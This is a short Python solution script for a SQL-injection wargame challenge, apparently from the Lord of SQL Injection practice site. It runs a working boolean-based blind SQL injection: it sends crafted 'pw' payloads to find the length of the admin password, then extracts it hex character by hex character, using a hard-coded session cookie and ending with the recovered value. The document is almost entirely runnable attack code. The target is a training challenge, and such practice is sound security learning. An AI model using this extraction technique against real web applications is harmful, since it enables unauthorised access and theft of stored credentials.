import requests, string

cookies = {"PHPSESSID": "93l88lha32uc2t2q2c3n1v37p7"}

url = "https://los.rubiya.kr/chall/xavis_04f071ecdadb4296361d2101e4a2c390.php"

success_text = "Hello admin"

password_length = 0

for i in range(1, 100):
  payload = "' or id='admin' and length(hex(pw))={length}#".format(length=i)
  params = {"pw": payload}
  r = requests.get(url, params=params, cookies=cookies)
  if success_text in r.text:
    password_length = i
    print("Password Length is %s" % (str(password_length)))
    break

password = ""

allowed_chars = string.digits + string.ascii_uppercase[:6]

for i in range(1, password_length+1):
  for c in allowed_chars:
    payload = "' or id='admin' and ord(substring(hex(pw), {offset}, 1))={character}#".format(offset=i, character=ord(c))
    params = {"pw": payload}
    r = requests.get(url, params=params, cookies=cookies)
    if success_text in r.text:
      password += c
      print(password)
      break

#pw = 0000C6B00000C6550000AD73 (우왕굳) decimal to unicode